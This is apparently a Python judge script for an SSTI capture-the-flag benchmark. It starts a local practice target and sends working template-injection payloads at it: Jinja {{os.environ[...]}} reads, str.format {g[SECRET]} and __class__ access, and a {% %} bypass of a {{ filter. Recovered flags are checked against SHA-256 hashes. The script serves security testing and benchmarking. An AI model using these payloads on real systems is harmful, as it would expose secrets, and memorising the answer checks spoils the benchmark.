#!/usr/bin/env python3
"""SSTI 深度基准 —— Python 侧独立机验（Go ssti_attack.go 的双语言复刻）。

不复用 Go 任何代码：纯标准库实现三类模板注入
（Jinja {{ }} 环境逃逸读 env / str.format 全局可达 / 黑名单剥 {{ 后 {% %} 绕过），
对 ssti_range.py 靶场实测，命中以 SHA-256 比对。

用法: python judge_ssti.py
"""

import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "ssti_range.py")
BENCH = os.path.join(HERE, "ssti_benchmark.json")
PORT = "18192"

RE_FLAG = re.compile(r"flag\{[^}\x00-\x1f\x7f]{4,}\}|[A-Z][A-Z0-9]{2,15}\{[^}\x00-\x1f\x7f]{4,}\}",
                     re.IGNORECASE)


def sh(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def fetch(url, timeout=10):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception:
        return 0, ""


def wait_ready(port, tries=100):
    for _ in range(tries):
        st, _ = fetch(f"http://127.0.0.1:{port}/", timeout=1)
        if st:
            return True
        time.sleep(0.1)
    return False


def render(base, endpoint, param, payload):
    """投递一个模板 payload，返回响应体。"""
    _, body = fetch(f"{base}{endpoint}?{param}={urllib.parse.quote(payload, safe='')}")
    return body


def exploit_expr(base):
    """Jinja {{ }}：先 7*7 探测求值，再经 os 读环境变量。"""
    endpoint, param = "/ssti_expr/hello", "name"
    found = []
    env_names = ("SSTI_EXPR_FLAG", "SSTI_FILT_FLAG", "FLAG", "SECRET", "GZCTF_FLAG")
    payloads = ["{{7*7}}"]
    payloads += [f"{{{{os.environ['{e}']}}}}" for e in env_names]
    payloads += [f"{{{{os.environ.get('{e}')}}}}" for e in env_names]
    payloads += ["{{os.environ}}"]
    for p in payloads:
        body = render(base, endpoint, param, p)
        found += RE_FLAG.findall(body)
        if any(RE_FLAG.search(f) for f in found):
            return found
    return found


def exploit_format(base):
    """str.format 注入：{g[SECRET]} 读靶机全局常量。"""
    endpoint, param = "/ssti_format/greet", "who"
    found = []
    payloads = ["{g[SECRET]}", "{g['SECRET']}", "{0.__class__}", "{g}", "{g.__class__}"]
    for p in payloads:
        body = render(base, endpoint, param, p)
        found += RE_FLAG.findall(body)
        if any(RE_FLAG.search(f) for f in found):
            return found
    return found


def exploit_filtered(base):
    """黑名单剥 {{ }}，Twig {% %} 定界绕过后同样逃逸读 env。"""
    endpoint, param = "/ssti_filtered/hello", "name"
    found = []
    env_names = ("SSTI_FILT_FLAG", "SSTI_EXPR_FLAG", "FLAG", "SECRET", "GZCTF_FLAG")
    payloads = ["{%7*7%}"]
    payloads += [f"{{%os.environ['{e}']%}}" for e in env_names]
    payloads += [f"{{%os.environ.get('{e}')%}}" for e in env_names]
    for p in payloads:
        body = render(base, endpoint, param, p)
        found += RE_FLAG.findall(body)
        if any(RE_FLAG.search(f) for f in found):
            return found
    return found


EXPLOITERS = {
    "ssti_expr": exploit_expr,
    "ssti_format": exploit_format,
    "ssti_filtered": exploit_filtered,
}


def main():
    if not os.path.exists(BENCH) or not os.path.exists(RANGE_PY):
        print("缺少 ssti_benchmark.json 或 ssti_range.py", file=sys.stderr)
        return 1
    doc = json.load(open(BENCH, encoding="utf-8"))["problems"]

    proc = subprocess.Popen([sys.executable, RANGE_PY, PORT],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_ready(PORT):
            print("靶场未就绪", file=sys.stderr)
            return 1
        base = f"http://127.0.0.1:{PORT}"
        hit = 0
        for pid in sorted(doc):
            found = EXPLOITERS[pid](base)
            ok = any(sh(f) == doc[pid]["flag_sha256"] for f in found)
            hit += 1 if ok else 0
            print(f"{pid:<14} {'SHA-256 校验通过' if ok else 'MISS'}  (候选 {len(found)})")
        print(f"SSTI 深度基准（Python 侧独立复刻）: {hit}/{len(doc)}")
        return 0 if hit == len(doc) else 1
    finally:
        proc.kill()


if __name__ == "__main__":
    sys.exit(main())
